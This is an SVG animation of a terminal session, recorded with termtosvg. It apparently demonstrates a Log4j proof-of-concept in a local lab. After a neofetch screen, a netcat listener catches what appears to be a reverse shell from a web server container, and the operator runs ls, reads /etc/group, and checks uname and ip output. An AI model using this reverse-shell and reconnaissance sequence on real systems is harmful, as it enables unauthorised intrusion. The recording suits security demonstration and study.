<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="terminal" baseProfile="full" viewBox="0 0 808 274" width="808" version="1.1">
    <defs>
        <termtosvg:template_settings xmlns:termtosvg="https://github.com/nbedos/termtosvg">
            <termtosvg:screen_geometry columns="101" rows="16"/>
            <termtosvg:animation type="css"/>
        </termtosvg:template_settings>
        <style type="text/css" id="generated-style"><![CDATA[#screen {
                font-family: 'DejaVu Sans Mono', monospace;
                font-style: normal;
                font-size: 14px;
            }

        text {
            dominant-baseline: text-before-edge;
            white-space: pre;
        }
    
            :root {
                --animation-duration: 597584ms;
            }

            @keyframes roll {
                0.000%{transform:translateY(0px)}
0.001%{transform:translateY(-306px)}
0.001%{transform:translateY(-612px)}
0.003%{transform:translateY(-918px)}
0.004%{transform:translateY(-1224px)}
0.004%{transform:translateY(-1530px)}
0.009%{transform:translateY(-1836px)}
0.009%{transform:translateY(-2142px)}
0.010%{transform:translateY(-2448px)}
0.014%{transform:translateY(-2754px)}
0.016%{transform:translateY(-3060px)}
0.019%{transform:translateY(-3366px)}
0.021%{transform:translateY(-3672px)}
0.029%{transform:translateY(-3978px)}
0.032%{transform:translateY(-4284px)}
0.033%{transform:translateY(-4590px)}
0.034%{transform:translateY(-4896px)}
0.035%{transform:translateY(-5202px)}
17.557%{transform:translateY(-5508px)}
17.758%{transform:translateY(-5814px)}
17.974%{transform:translateY(-6120px)}
17.979%{transform:translateY(-6426px)}
93.165%{transform:translateY(-6732px)}
93.640%{transform:translateY(-7038px)}
93.661%{transform:translateY(-7344px)}
93.705%{transform:translateY(-7650px)}
93.718%{transform:translateY(-7956px)}
93.719%{transform:translateY(-8262px)}
94.195%{transform:translateY(-8568px)}
94.217%{transform:translateY(-8874px)}
94.234%{transform:translateY(-9180px)}
94.274%{transform:translateY(-9486px)}
94.376%{transform:translateY(-9792px)}
94.441%{transform:translateY(-10098px)}
94.476%{transform:translateY(-10404px)}
94.513%{transform:translateY(-10710px)}
94.624%{transform:translateY(-11016px)}
94.723%{transform:translateY(-11322px)}
94.757%{transform:translateY(-11628px)}
94.790%{transform:translateY(-11934px)}
94.823%{transform:translateY(-12240px)}
94.903%{transform:translateY(-12546px)}
95.013%{transform:translateY(-12852px)}
95.028%{transform:translateY(-13158px)}
95.028%{transform:translateY(-13464px)}
95.029%{transform:translateY(-13770px)}
96.724%{transform:translateY(-14076px)}
96.752%{transform:translateY(-14382px)}
96.800%{transform:translateY(-14688px)}
96.842%{transform:translateY(-14994px)}
96.859%{transform:translateY(-15300px)}
96.859%{transform:translateY(-15606px)}
97.043%{transform:translateY(-15912px)}
97.076%{transform:translateY(-16218px)}
97.100%{transform:translateY(-16524px)}
97.120%{transform:translateY(-16830px)}
97.140%{transform:translateY(-17136px)}
97.151%{transform:translateY(-17442px)}
97.274%{transform:translateY(-17748px)}
97.309%{transform:translateY(-18054px)}
97.361%{transform:translateY(-18360px)}
97.371%{transform:translateY(-18666px)}
97.371%{transform:translateY(-18972px)}
97.869%{transform:translateY(-19278px)}
97.899%{transform:translateY(-19584px)}
97.936%{transform:translateY(-19890px)}
97.981%{transform:translateY(-20196px)}
98.040%{transform:translateY(-20502px)}
98.051%{transform:translateY(-20808px)}
98.051%{transform:translateY(-21114px)}
99.650%{transform:translateY(-21420px)}
99.652%{transform:translateY(-21726px)}
99.833%{transform:translateY(-22032px)}
100.000%{transform:translateY(-22032px)}
            }

            #screen_view {
                animation-duration: 597584ms;
                animation-iteration-count:infinite;
                animation-name:roll;
                animation-timing-function: steps(1,end);
                animation-fill-mode: forwards;
            }
        ]]></style>
        <style type="text/css" id="user-style">
            /* The colors defined below are the default 16 colors used for rendering text of the terminal. Adjust
               them as needed.
               PowerShell colors based on https://en.wikipedia.org/wiki/ANSI_escape_code#Colors */
            .foreground {fill: #cccccc;}
            .background {fill: #0c0c0c;}
            .color0 {fill: #0c0c0c;}
            .color1 {fill: #c50f1f;}
            .color2 {fill: #13a10e;}
            .color3 {fill: #c19c00;}
            .color4 {fill: #0037da;}
            .color5 {fill: #881798;}
            .color6 {fill: #3a96dd;}
            .color7 {fill: #cccccc;}
            .color8 {fill: #767676;}
            .color9 {fill: #e74856;}
            .color10 {fill: #16c60c;}
            .color11 {fill: #f9f1a5;}
            .color12 {fill: #3b78ff;}
            .color13 {fill: #b4009e;}
            .color14 {fill: #61d6d6;}
            .color15 {fill: #f2f2f2;}
        </style>
    </defs>
    <svg id="screen" width="808" height="272" viewBox="0 0 808 272" preserveAspectRatio="xMidYMin slice">
    <rect class="background" height="100%" width="100%" x="0" y="0"/><defs><g id="g1"><text x="0" textLength="192" font-weight="bold" class="color14">               `+oooooo:</text></g><g id="g2"><text x="0" textLength="200" font-weight="bold" class="color14">               -+oooooo+:</text></g><g id="g3"><text x="0" textLength="208" font-weight="bold" class="color14">             `/:-:++oooo+:</text></g><g id="g4"><text x="0" textLength="216" font-weight="bold" class="color14">            `/++++/+++++++:</text></g><g id="g5"><text x="0" textLength="224" font-weight="bold" class="color14">           `/++++++++++++++:</text></g><g id="g6"><text x="0" textLength="240" font-weight="bold" class="color14">          `/+++ooooooooooooo/`</text></g><g id="g7"><text x="0" textLength="248" font-weight="bold" class="color14">         ./ooosssso++osssssso+`</text></g><g id="g8"><text x="0" textLength="256" font-weight="bold" class="color14">        .oossssso-````/ossssss+`</text></g><g id="g9"><text x="0" textLength="264" font-weight="bold" class="color14">       -osssssso.      :ssssssso.</text></g><g id="g10"><text x="0" textLength="272" font-weight="bold" class="color14">      :osssssss/        osssso+++.</text></g><g id="g11"><text x="0" textLength="272" font-weight="bold" class="color14">     /ossssssss/        +ssssooo/-</text></g><g id="g12"><text x="0" textLength="288" font-weight="bold" class="color14">   `/ossssso+/:-        -:/+osssso+-</text></g><g id="g13"><text x="0" textLength="296" font-weight="bold" class="color14">  `+sso+:-`                 `.-/+oso:</text></g><g id="g14"><text x="0" textLength="304" font-weight="bold" class="color14"> `++:.                           `-/+/</text></g><g id="g15"><text x="0" textLength="304" font-weight="bold" class="color14"> .`                                 `/</text></g><g id="g16"><text x="0" textLength="192" font-weight="bold" class="color14">               `+oooooo:</text><text x="328" textLength="104" font-weight="bold" class="color14">trentonknight</text><text x="432" textLength="8" class="foreground">@</text><text x="440" textLength="56" font-weight="bold" class="color14">archMac</text><text x="496" textLength="8" class="foreground"> </text></g><g id="g17"><text x="0" textLength="200" font-weight="bold" class="color14">               -+oooooo+:</text><text x="328" textLength="176" class="foreground">--------------------- </text></g><g id="g18"><text x="0" textLength="208" font-weight="bold" class="color14">             `/:-:++oooo+:</text><text x="328" textLength="16" font-weight="bold" class="color14">OS</text><text x="344" textLength="160" class="foreground">: Arch Linux x86_64 </text></g><g id="g19"><text x="0" textLength="216" font-weight="bold" class="color14">            `/++++/+++++++:</text><text x="328" textLength="32" font-weight="bold" class="color14">Host</text><text x="360" textLength="120" class="foreground">: iMac12,1 1.0 </text></g><g id="g20"><text x="0" textLength="224" font-weight="bold" class="color14">           `/++++++++++++++:</text><text x="328" textLength="48" font-weight="bold" class="color14">Kernel</text><text x="376" textLength="144" class="foreground">: 5.15.12-arch1-1 </text></g><g id="g21"><text x="0" textLength="240" font-weight="bold" class="color14">          `/+++ooooooooooooo/`</text><text x="328" textLength="48" font-weight="bold" class="color14">Uptime</text><text x="376" textLength="80" class="foreground">: 26 mins </text></g><g id="g22"><text x="0" textLength="248" font-weight="bold" class="color14">         ./ooosssso++osssssso+`</text><text x="328" textLength="64" font-weight="bold" class="color14">Packages</text><text x="392" textLength="120" class="foreground">: 788 (pacman) </text></g><g id="g23"><text x="0" textLength="256" font-weight="bold" class="color14">        .oossssso-````/ossssss+`</text><text x="328" textLength="40" font-weight="bold" class="color14">Shell</text><text x="368" textLength="112" class="foreground">: bash 5.1.12 </text></g><g id="g24"><text x="0" textLength="264" font-weight="bold" class="color14">       -osssssso.      :ssssssso.</text><text x="328" textLength="80" font-weight="bold" class="color14">Resolution</text><text x="408" textLength="96" class="foreground">: 1920x1080 </text></g><g id="g25"><text x="0" textLength="272" font-weight="bold" class="color14">      :osssssss/        osssso+++.</text><text x="328" textLength="16" font-weight="bold" class="color14">WM</text><text x="344" textLength="56" class="foreground">: sway </text></g><g id="g26"><text x="0" textLength="272" font-weight="bold" class="color14">     /ossssssss/        +ssssooo/-</text><text x="328" textLength="40" font-weight="bold" class="color14">Theme</text><text x="368" textLength="136" class="foreground">: Adwaita [GTK3] </text></g><g id="g27"><text x="0" textLength="288" font-weight="bold" class="color14">   `/ossssso+/:-        -:/+osssso+-</text><text x="328" textLength="40" font-weight="bold" class="color14">Icons</text><text x="368" textLength="136" class="foreground">: Adwaita [GTK3] </text></g><g id="g28"><text x="0" textLength="296" font-weight="bold" class="color14">  `+sso+:-`                 `.-/+oso:</text><text x="328" textLength="64" font-weight="bold" class="color14">Terminal</text><text x="392" textLength="96" class="foreground">: termtosvg </text></g><g id="g29"><text x="0" textLength="304" font-weight="bold" class="color14"> `++:.                           `-/+/</text><text x="328" textLength="24" font-weight="bold" class="color14">CPU</text><text x="352" textLength="256" class="foreground">: Intel i5-2400S (4) @ 3.300GHz </text></g><g id="g30"><text x="0" textLength="304" font-weight="bold" class="color14"> .`                                 `/</text><text x="328" textLength="24" font-weight="bold" class="color14">GPU</text><text x="352" textLength="400" class="foreground">: AMD ATI Radeon HD 6630M/6650M/6750M/7670M/7690M </text></g><g id="g31"><text x="328" textLength="24" font-weight="bold" class="color14">GPU</text><text x="352" textLength="360" class="foreground">: Intel 2nd Generation Core Processor Family </text></g><g id="g32"><text x="328" textLength="48" font-weight="bold" class="color14">Memory</text><text x="376" textLength="160" class="foreground">: 1443MiB / 7928MiB </text></g><g id="g33"><text x="328" textLength="24" class="color0">   </text><text x="352" textLength="24" class="color1">   </text><text x="376" textLength="24" class="color2">   </text><text x="400" textLength="24" class="color3">   </text><text x="424" textLength="24" class="color4">   </text><text x="448" textLength="24" class="color5">   </text><text x="472" textLength="24" class="color6">   </text><text x="496" textLength="24" class="color7">   </text></g><g id="g34"><text x="328" textLength="24" class="color8">   </text><text x="352" textLength="24" class="color9">   </text><text x="376" textLength="24" class="color10">   </text><text x="400" textLength="24" class="color11">   </text><text x="424" textLength="24" class="color12">   </text><text x="448" textLength="24" class="color13">   </text><text x="472" textLength="24" class="color14">   </text><text x="496" textLength="24" class="color15">   </text></g><g id="g35"><text x="0" textLength="8" class="background"> </text></g><g id="g36"><text x="0" textLength="352" class="foreground">[trentonknight@archMac log4j-exploit-code]$ </text><text x="352" textLength="8" class="background"> </text></g><g id="g37"><text x="0" textLength="352" class="foreground">[trentonknight@archMac log4j-exploit-code]$ </text><text x="352" textLength="184" class="background">nc -lv 172.17.0.1 9001 </text></g><g id="g38"><text x="0" textLength="528" class="foreground">[trentonknight@archMac log4j-exploit-code]$ nc -lv 172.17.0.1 9001</text><text x="528" textLength="8" class="background"> </text></g><g id="g39"><text x="0" textLength="528" class="foreground">[trentonknight@archMac log4j-exploit-code]$ nc -lv 172.17.0.1 9001</text></g><g id="g40"><text x="0" textLength="200" class="foreground">Listening on archMac 9001</text></g><g id="g41"><text x="0" textLength="336" class="foreground">Connection received on 172.16.238.10 41390</text></g><g id="g42"><text x="0" textLength="8" class="foreground">l</text><text x="8" textLength="8" class="background"> </text></g><g id="g43"><text x="0" textLength="16" class="foreground">ls</text><text x="16" textLength="8" class="background"> </text></g><g id="g44"><text x="0" textLength="16" class="foreground">ls</text></g><g id="g45"><text x="0" textLength="48" class="foreground">log4j-</text><text x="48" textLength="8" class="background"> </text></g><g id="g46"><text x="0" textLength="120" class="foreground">log4j-shell-poc</text></g><g id="g47"><text x="0" textLength="48" class="foreground">maven3</text></g><g id="g48"><text x="0" textLength="56" class="foreground">tomcat8</text></g><g id="g49"><text x="0" textLength="8" class="foreground">c</text><text x="8" textLength="8" class="background"> </text></g><g id="g50"><text x="0" textLength="16" class="foreground">ca</text><text x="16" textLength="8" class="background"> </text></g><g id="g51"><text x="0" textLength="24" class="foreground">cat</text><text x="24" textLength="8" class="background"> </text></g><g id="g52"><text x="0" textLength="32" class="foreground">cat </text><text x="32" textLength="8" class="background"> </text></g><g id="g53"><text x="0" textLength="40" class="foreground">cat /</text><text x="40" textLength="8" class="background"> </text></g><g id="g54"><text x="0" textLength="48" class="foreground">cat /e</text><text x="48" textLength="8" class="background"> </text></g><g id="g55"><text x="0" textLength="56" class="foreground">cat /et</text><text x="56" textLength="8" class="background"> </text></g><g id="g56"><text x="0" textLength="64" class="foreground">cat /etc</text><text x="64" textLength="8" class="background"> </text></g><g id="g57"><text x="0" textLength="72" class="foreground">cat /etc/</text><text x="72" textLength="8" class="background"> </text></g><g id="g58"><text x="0" textLength="80" class="foreground">cat /etc/g</text><text x="80" textLength="8" class="background"> </text></g><g id="g59"><text x="0" textLength="88" class="foreground">cat /etc/gr</text><text x="88" textLength="8" class="background"> </text></g><g id="g60"><text x="0" textLength="96" class="foreground">cat /etc/gro</text><text x="96" textLength="8" class="background"> </text></g><g id="g61"><text x="0" textLength="104" class="foreground">cat /etc/grou</text><text x="104" textLength="8" class="background"> </text></g><g id="g62"><text x="0" textLength="112" class="foreground">cat /etc/group</text><text x="112" textLength="8" class="background"> </text></g><g id="g63"><text x="0" textLength="112" class="foreground">cat /etc/group</text></g><g id="g64"><text x="0" textLength="40" class="foreground">root:</text><text x="40" textLength="8" class="background"> </text></g><g id="g65"><text x="0" textLength="88" class="foreground">gnats:x:41:</text></g><g id="g66"><text x="0" textLength="96" class="foreground">shadow:x:42:</text></g><g id="g67"><text x="0" textLength="80" class="foreground">utmp:x:43:</text></g><g id="g68"><text x="0" textLength="88" class="foreground">video:x:44:</text></g><g id="g69"><text x="0" textLength="80" class="foreground">sasl:x:45:</text></g><g id="g70"><text x="0" textLength="104" class="foreground">plugdev:x:46:</text></g><g id="g71"><text x="0" textLength="88" class="foreground">staff:x:50:</text></g><g id="g72"><text x="0" textLength="88" class="foreground">games:x:60:</text></g><g id="g73"><text x="0" textLength="128" class="foreground">users:x:100:user</text></g><g id="g74"><text x="0" textLength="128" class="foreground">nogroup:x:65534:</text></g><g id="g75"><text x="0" textLength="96" class="foreground">input:x:101:</text></g><g id="g76"><text x="0" textLength="176" class="foreground">systemd-journal:x:102:</text></g><g id="g77"><text x="0" textLength="184" class="foreground">systemd-timesync:x:103:</text></g><g id="g78"><text x="0" textLength="176" class="foreground">systemd-network:x:104:</text></g><g id="g79"><text x="0" textLength="176" class="foreground">systemd-resolve:x:105:</text></g><g id="g80"><text x="0" textLength="152" class="foreground">systemd-bus-proxy:x</text><text x="152" textLength="8" class="background"> </text></g><g id="g81"><text x="0" textLength="192" class="foreground">systemd-bus-proxy:x:106:</text></g><g id="g82"><text x="0" textLength="96" class="foreground">user:x:5001:</text></g><g id="g83"><text x="0" textLength="80" class="foreground">ssh:x:107:</text></g><g id="g84"><text x="0" textLength="8" class="foreground">p</text><text x="8" textLength="8" class="background"> </text></g><g id="g85"><text x="0" textLength="16" class="foreground">pw</text><text x="16" textLength="8" class="background"> </text></g><g id="g86"><text x="0" textLength="24" class="foreground">pwd</text><text x="24" textLength="8" class="background"> </text></g><g id="g87"><text x="0" textLength="24" class="foreground">pwd</text></g><g id="g88"><text x="0" textLength="32" class="foreground">/hom</text><text x="32" textLength="8" class="background"> </text></g><g id="g89"><text x="0" textLength="80" class="foreground">/home/user</text></g><g id="g90"><text x="0" textLength="8" class="foreground">u</text><text x="8" textLength="8" class="background"> </text></g><g id="g91"><text x="0" textLength="16" class="foreground">un</text><text x="16" textLength="8" class="background"> </text></g><g id="g92"><text x="0" textLength="24" class="foreground">una</text><text x="24" textLength="8" class="background"> </text></g><g id="g93"><text x="0" textLength="32" class="foreground">unam</text><text x="32" textLength="8" class="background"> </text></g><g id="g94"><text x="0" textLength="40" class="foreground">uname</text><text x="40" textLength="8" class="background"> </text></g><g id="g95"><text x="0" textLength="48" class="foreground">uname </text><text x="48" textLength="8" class="background"> </text></g><g id="g96"><text x="0" textLength="56" class="foreground">uname -</text><text x="56" textLength="8" class="background"> </text></g><g id="g97"><text x="0" textLength="64" class="foreground">uname -a</text><text x="64" textLength="8" class="background"> </text></g><g id="g98"><text x="0" textLength="64" class="foreground">uname -a</text></g><g id="g99"><text x="0" textLength="40" class="foreground">Linux</text><text x="40" textLength="8" class="background"> </text></g><g id="g100"><text x="0" textLength="736" class="foreground">Linux websvr 5.15.12-arch1-1 #1 SMP PREEMPT Wed, 29 Dec 2021 12:04:56 +0000 x86_64 GNU/Linux</text></g><g id="g101"><text x="0" textLength="8" class="foreground">i</text><text x="8" textLength="8" class="background"> </text></g><g id="g102"><text x="0" textLength="16" class="foreground">ip</text><text x="16" textLength="8" class="background"> </text></g><g id="g103"><text x="0" textLength="24" class="foreground">ip </text><text x="24" textLength="8" class="background"> </text></g><g id="g104"><text x="0" textLength="32" class="foreground">ip a</text><text x="32" textLength="8" class="background"> </text></g><g id="g105"><text x="0" textLength="32" class="foreground">ip a</text></g><g id="g106"><text x="0" textLength="32" class="foreground">1: l</text><text x="32" textLength="8" class="background"> </text></g><g id="g107"><text x="0" textLength="728" class="foreground">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</text></g><g id="g108"><text x="0" textLength="456" class="foreground">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</text></g><g id="g109"><text x="0" textLength="272" class="foreground">    inet 127.0.0.1/8 scope host lo</text></g><g id="g110"><text x="0" textLength="368" class="foreground">       valid_lft forever preferred_lft forever</text></g><g id="g111"><text x="0" textLength="760" class="foreground">35: eth0@if36: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </text></g><g id="g112"><text x="0" textLength="432" class="foreground">    link/ether 02:42:ac:10:ee:0a brd ff:ff:ff:ff:ff:ff</text></g><g id="g113"><text x="0" textLength="496" class="foreground">    inet 172.16.238.10/24 brd 172.16.238.255 scope global eth0</text></g><g id="g114"><text x="0" textLength="16" class="foreground">^C</text><text x="16" textLength="8" class="background"> </text></g><g id="g115"><text x="0" textLength="16" class="foreground">^C</text></g><g id="g116"><text x="0" textLength="352" class="foreground">[trentonknight@archMac log4j-exploit-code]$ </text></g><g id="g117"><text x="0" textLength="32" class="foreground">exit</text></g></defs><g id="screen_view"><g/><g><use xlink:href="#g1" y="306"/><use xlink:href="#g2" y="323"/><use xlink:href="#g3" y="340"/><use xlink:href="#g4" y="357"/><use xlink:href="#g5" y="374"/><use xlink:href="#g6" y="391"/><use xlink:href="#g7" y="408"/><use xlink:href="#g8" y="425"/><use xlink:href="#g9" y="442"/><use xlink:href="#g10" y="459"/><use xlink:href="#g11" y="476"/><use xlink:href="#g12" y="493"/><use xlink:href="#g13" y="510"/><use xlink:href="#g14" y="527"/><use xlink:href="#g15" y="544"/></g><g><use xlink:href="#g16" y="612"/><use xlink:href="#g2" y="629"/><use xlink:href="#g3" y="646"/><use xlink:href="#g4" y="663"/><use xlink:href="#g5" y="680"/><use xlink:href="#g6" y="697"/><use xlink:href="#g7" y="714"/><use xlink:href="#g8" y="731"/><use xlink:href="#g9" y="748"/><use xlink:href="#g10" y="765"/><use xlink:href="#g11" y="782"/><use xlink:href="#g12" y="799"/><use xlink:href="#g13" y="816"/><use xlink:href="#g14" y="833"/><use xlink:href="#g15" y="850"/></g><g><use xlink:href="#g16" y="918"/><use xlink:href="#g17" y="935"/><use xlink:href="#g18" y="952"/><use xlink:href="#g4" y="969"/><use xlink:href="#g5" y="986"/><use xlink:href="#g6" y="1003"/><use xlink:href="#g7" y="1020"/><use xlink:href="#g8" y="1037"/><use xlink:href="#g9" y="1054"/><use xlink:href="#g10" y="1071"/><use xlink:href="#g11" y="1088"/><use xlink:href="#g12" y="1105"/><use xlink:href="#g13" y="1122"/><use xlink:href="#g14" y="1139"/><use xlink:href="#g15" y="1156"/></g><g><use xlink:href="#g16" y="1224"/><use xlink:href="#g17" y="1241"/><use xlink:href="#g18" y="1258"/><use xlink:href="#g19" y="1275"/><use xlink:href="#g20" y="1292"/><use xlink:href="#g6" y="1309"/><use xlink:href="#g7" y="1326"/><use xlink:href="#g8" y="1343"/><use xlink:href="#g9" y="1360"/><use xlink:href="#g10" y="1377"/><use xlink:href="#g11" y="1394"/><use xlink:href="#g12" y="1411"/><use xlink:href="#g13" y="1428"/><use xlink:href="#g14" y="1445"/><use xlink:href="#g15" y="1462"/></g><g><use xlink:href="#g16" y="1530"/><use xlink:href="#g17" y="1547"/><use xlink:href="#g18" y="1564"/><use xlink:href="#g19" y="1581"/><use xlink:href="#g20" y="1598"/><use xlink:href="#g21" y="1615"/><use xlink:href="#g7" y="1632"/><use xlink:href="#g8" y="1649"/><use xlink:href="#g9" y="1666"/><use xlink:href="#g10" y="1683"/><use xlink:href="#g11" y="1700"/><use xlink:href="#g12" y="1717"/><use xlink:href="#g13" y="1734"/><use xlink:href="#g14" y="1751"/><use xlink:href="#g15" y="1768"/></g><g><use xlink:href="#g16" y="1836"/><use xlink:href="#g17" y="1853"/><use xlink:href="#g18" y="1870"/><use xlink:href="#g19" y="1887"/><use xlink:href="#g20" y="1904"/><use xlink:href="#g21" y="1921"/><use xlink:href="#g22" y="1938"/><use xlink:href="#g8" y="1955"/><use xlink:href="#g9" y="1972"/><use xlink:href="#g10" y="1989"/><use xlink:href="#g11" y="2006"/><use xlink:href="#g12" y="2023"/><use xlink:href="#g13" y="2040"/><use xlink:href="#g14" y="2057"/><use xlink:href="#g15" y="2074"/></g><g><use xlink:href="#g16" y="2142"/><use xlink:href="#g17" y="2159"/><use xlink:href="#g18" y="2176"/><use xlink:href="#g19" y="2193"/><use xlink:href="#g20" y="2210"/><use xlink:href="#g21" y="2227"/><use xlink:href="#g22" y="2244"/><use xlink:href="#g23" y="2261"/><use xlink:href="#g9" y="2278"/><use xlink:href="#g10" y="2295"/><use xlink:href="#g11" y="2312"/><use xlink:href="#g12" y="2329"/><use xlink:href="#g13" y="2346"/><use xlink:href="#g14" y="2363"/><use xlink:href="#g15" y="2380"/></g><g><use xlink:href="#g16" y="2448"/><use xlink:href="#g17" y="2465"/><use xlink:href="#g18" y="2482"/><use xlink:href="#g19" y="2499"/><use xlink:href="#g20" y="2516"/><use xlink:href="#g21" y="2533"/><use xlink:href="#g22" y="2550"/><use xlink:href="#g23" y="2567"/><use xlink:href="#g24" y="2584"/><use xlink:href="#g10" y="2601"/><use xlink:href="#g11" y="2618"/><use xlink:href="#g12" y="2635"/><use xlink:href="#g13" y="2652"/><use xlink:href="#g14" y="2669"/><use xlink:href="#g15" y="2686"/></g><g><use xlink:href="#g16" y="2754"/><use xlink:href="#g17" y="2771"/><use xlink:href="#g18" y="2788"/><use xlink:href="#g19" y="2805"/><use xlink:href="#g20" y="2822"/><use xlink:href="#g21" y="2839"/><use xlink:href="#g22" y="2856"/><use xlink:href="#g23" y="2873"/><use xlink:href="#g24" y="2890"/><use xlink:href="#g25" y="2907"/><use xlink:href="#g11" y="2924"/><use xlink:href="#g12" y="2941"/><use xlink:href="#g13" y="2958"/><use xlink:href="#g14" y="2975"/><use xlink:href="#g15" y="2992"/></g><g><use xlink:href="#g16" y="3060"/><use xlink:href="#g17" y="3077"/><use xlink:href="#g18" y="3094"/><use xlink:href="#g19" y="3111"/><use xlink:href="#g20" y="3128"/><use xlink:href="#g21" y="3145"/><use xlink:href="#g22" y="3162"/><use xlink:href="#g23" y="3179"/><use xlink:href="#g24" y="3196"/><use xlink:href="#g25" y="3213"/><use xlink:href="#g26" y="3230"/><use xlink:href="#g12" y="3247"/><use xlink:href="#g13" y="3264"/><use xlink:href="#g14" y="3281"/><use xlink:href="#g15" y="3298"/></g><g><use xlink:href="#g16" y="3366"/><use xlink:href="#g17" y="3383"/><use xlink:href="#g18" y="3400"/><use xlink:href="#g19" y="3417"/><use xlink:href="#g20" y="3434"/><use xlink:href="#g21" y="3451"/><use xlink:href="#g22" y="3468"/><use xlink:href="#g23" y="3485"/><use xlink:href="#g24" y="3502"/><use xlink:href="#g25" y="3519"/><use xlink:href="#g26" y="3536"/><use xlink:href="#g27" y="3553"/><use xlink:href="#g13" y="3570"/><use xlink:href="#g14" y="3587"/><use xlink:href="#g15" y="3604"/></g><g><use xlink:href="#g16" y="3672"/><use xlink:href="#g17" y="3689"/><use xlink:href="#g18" y="3706"/><use xlink:href="#g19" y="3723"/><use xlink:href="#g20" y="3740"/><use xlink:href="#g21" y="3757"/><use xlink:href="#g22" y="3774"/><use xlink:href="#g23" y="3791"/><use xlink:href="#g24" y="3808"/><use xlink:href="#g25" y="3825"/><use xlink:href="#g26" y="3842"/><use xlink:href="#g27" y="3859"/><use xlink:href="#g28" y="3876"/><use xlink:href="#g14" y="3893"/><use xlink:href="#g15" y="3910"/></g><g><use xlink:href="#g16" y="3978"/><use xlink:href="#g17" y="3995"/><use xlink:href="#g18" y="4012"/><use xlink:href="#g19" y="4029"/><use xlink:href="#g20" y="4046"/><use xlink:href="#g21" y="4063"/><use xlink:href="#g22" y="4080"/><use xlink:href="#g23" y="4097"/><use xlink:href="#g24" y="4114"/><use xlink:href="#g25" y="4131"/><use xlink:href="#g26" y="4148"/><use xlink:href="#g27" y="4165"/><use xlink:href="#g28" y="4182"/><use xlink:href="#g29" y="4199"/><use xlink:href="#g15" y="4216"/></g><g><use xlink:href="#g16" y="4284"/><use xlink:href="#g17" y="4301"/><use xlink:href="#g18" y="4318"/><use xlink:href="#g19" y="4335"/><use xlink:href="#g20" y="4352"/><use xlink:href="#g21" y="4369"/><use xlink:href="#g22" y="4386"/><use xlink:href="#g23" y="4403"/><use xlink:href="#g24" y="4420"/><use xlink:href="#g25" y="4437"/><use xlink:href="#g26" y="4454"/><use xlink:href="#g27" y="4471"/><use xlink:href="#g28" y="4488"/><use xlink:href="#g29" y="4505"/><use xlink:href="#g30" y="4522"/></g><g><use xlink:href="#g17" y="4590"/><use xlink:href="#g18" y="4607"/><use xlink:href="#g19" y="4624"/><use xlink:href="#g20" y="4641"/><use xlink:href="#g21" y="4658"/><use xlink:href="#g22" y="4675"/><use xlink:href="#g23" y="4692"/><use xlink:href="#g24" y="4709"/><use xlink:href="#g25" y="4726"/><use xlink:href="#g26" y="4743"/><use xlink:href="#g27" y="4760"/><use xlink:href="#g28" y="4777"/><use xlink:href="#g29" y="4794"/><use xlink:href="#g30" y="4811"/><use xlink:href="#g31" y="4828"/></g><g><use xlink:href="#g23" y="4896"/><use xlink:href="#g24" y="4913"/><use xlink:href="#g25" y="4930"/><use xlink:href="#g26" y="4947"/><use xlink:href="#g27" y="4964"/><use xlink:href="#g28" y="4981"/><use xlink:href="#g29" y="4998"/><use xlink:href="#g30" y="5015"/><use xlink:href="#g31" y="5032"/><use xlink:href="#g32" y="5049"/><rect x="328" y="5083" width="24" height="17" class="color0"/><rect x="352" y="5083" width="24" height="17" class="color1"/><rect x="376" y="5083" width="24" height="17" class="color2"/><rect x="400" y="5083" width="24" height="17" class="color3"/><rect x="424" y="5083" width="24" height="17" class="color4"/><rect x="448" y="5083" width="24" height="17" class="color5"/><rect x="472" y="5083" width="24" height="17" class="color6"/><rect x="496" y="5083" width="24" height="17" class="color7"/><use xlink:href="#g33" y="5083"/><rect x="328" y="5100" width="24" height="17" class="color8"/><rect x="352" y="5100" width="24" height="17" class="color9"/><rect x="376" y="5100" width="24" height="17" class="color10"/><rect x="400" y="5100" width="24" height="17" class="color11"/><rect x="424" y="5100" width="24" height="17" class="color12"/><rect x="448" y="5100" width="24" height="17" class="color13"/><rect x="472" y="5100" width="24" height="17" class="color14"/><rect x="496" y="5100" width="24" height="17" class="color15"/><use xlink:href="#g34" y="5100"/><rect x="0" y="5151" width="8" height="17" class="foreground"/><use xlink:href="#g35" y="5151"/></g><g><use xlink:href="#g23" y="5202"/><use xlink:href="#g24" y="5219"/><use xlink:href="#g25" y="5236"/><use xlink:href="#g26" y="5253"/><use xlink:href="#g27" y="5270"/><use xlink:href="#g28" y="5287"/><use xlink:href="#g29" y="5304"/><use xlink:href="#g30" y="5321"/><use xlink:href="#g31" y="5338"/><use xlink:href="#g32" y="5355"/><rect x="328" y="5389" width="24" height="17" class="color0"/><rect x="352" y="5389" width="24" height="17" class="color1"/><rect x="376" y="5389" width="24" height="17" class="color2"/><rect x="400" y="5389" width="24" height="17" class="color3"/><rect x="424" y="5389" width="24" height="17" class="color4"/><rect x="448" y="5389" width="24" height="17" class="color5"/><rect x="472" y="5389" width="24" height="17" class="color6"/><rect x="496" y="5389" width="24" height="17" class="color7"/><use xlink:href="#g33" y="5389"/><rect x="328" y="5406" width="24" height="17" class="color8"/><rect x="352" y="5406" width="24" height="17" class="color9"/><rect x="376" y="5406" width="24" height="17" class="color10"/><rect x="400" y="5406" width="24" height="17" class="color11"/><rect x="424" y="5406" width="24" height="17" class="color12"/><rect x="448" y="5406" width="24" height="17" class="color13"/><rect x="472" y="5406" width="24" height="17" class="color14"/><rect x="496" y="5406" width="24" height="17" class="color15"/><use xlink:href="#g34" y="5406"/><rect x="352" y="5457" width="8" height="17" class="foreground"/><use xlink:href="#g36" y="5457"/></g><g><use xlink:href="#g23" y="5508"/><use xlink:href="#g24" y="5525"/><use xlink:href="#g25" y="5542"/><use xlink:href="#g26" y="5559"/><use xlink:href="#g27" y="5576"/><use xlink:href="#g28" y="5593"/><use xlink:href="#g29" y="5610"/><use xlink:href="#g30" y="5627"/><use xlink:href="#g31" y="5644"/><use xlink:href="#g32" y="5661"/><rect x="328" y="5695" width="24" height="17" class="color0"/><rect x="352" y="5695" width="24" height="17" class="color1"/><rect x="376" y="5695" width="24" height="17" class="color2"/><rect x="400" y="5695" width="24" height="17" 